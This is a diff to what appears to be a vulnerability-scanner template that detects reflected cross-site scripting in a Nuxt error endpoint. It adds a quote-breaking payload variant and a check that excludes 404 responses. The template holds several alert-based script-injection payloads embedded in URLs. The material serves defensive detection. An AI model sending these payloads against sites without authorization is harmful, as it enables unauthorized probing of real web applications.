@@ -22,7 +22,8 @@ http:
       - "{{BaseURL}}/__nuxt_error?stack=%0A<script>alert(document.domain)</script>"
       - "{{BaseURL}}/__nuxt_error?stack=%0D%0A<script>alert(document.domain)</script>"
       - "{{BaseURL}}/__nuxt_error?stack=<script>alert(document.domain)</script>"
-
+      - "{{BaseURL}}/__nuxt_error?stack=\"><script>alert(document.domain)</script>"
+      
     matchers-condition: and
     matchers:
       - type: word
@@ -31,8 +32,13 @@ http:
           - "<script>alert(document.domain)</script>"
           - "window.__NUXT__"
         condition: and
-
+        
       - type: word
         part: header
         words:
           - "text/html"
+          
+      - type: status
+        status:
+          - 404
+        negative: true
